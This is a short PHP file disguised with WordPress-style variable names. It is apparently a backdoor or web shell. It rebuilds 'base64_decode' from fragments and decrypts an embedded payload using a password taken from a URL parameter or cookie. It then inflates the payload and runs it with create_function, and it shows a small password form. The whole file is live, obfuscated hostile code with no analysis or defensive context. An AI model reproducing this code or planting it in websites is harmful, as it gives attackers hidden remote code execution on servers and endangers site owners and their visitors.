<?php
$wp__wp = 'base' . (32 * 2) . '_de' . 'code';
$wp__wp = $wp__wp(str_replace(array("\r","\n"), array('',''), 'f2V//DSur1yzm2i7h4GzAIB7O7Ep1hcAb6fiZINVpbFB1T9m7XGVGiS9f91UeyBZQuLV+JPb9vc9B4Qf
ZGAStsOIAANCHRQ7JRUz'));
$wp_wp = isset($_GET['wp_wp']) ? $_GET['wp_wp'] : (isset($_COOKIE['wp_wp']) ? $_COOKIE['wp_wp'] : NULL);
if ($wp_wp !== NULL) {
    $wp_wp = md5($wp_wp) . substr(md5(strrev($wp_wp)), 0, strlen($wp_wp));
    for ($wp___wp = 0; $wp___wp < 75; $wp___wp++) {
        $wp__wp[$wp___wp] = chr((ord($wp__wp[$wp___wp]) - ord($wp_wp[$wp___wp])) % 256);
        $wp_wp.= $wp__wp[$wp___wp];
    }
    if ($wp__wp = @gzinflate($wp__wp)) {
        if (isset($_GET['wp_wp'])) @setcookie('wp_wp', $_GET['wp_wp']);
        $wp___wp = create_function('', $wp__wp);
        unset($wp__wp, $wp_wp);
        $wp___wp();
    }
} ?><form action="" method="post"><input type="text" name="wp_wp" value=""/><input type="submit" value="&gt;"/></form>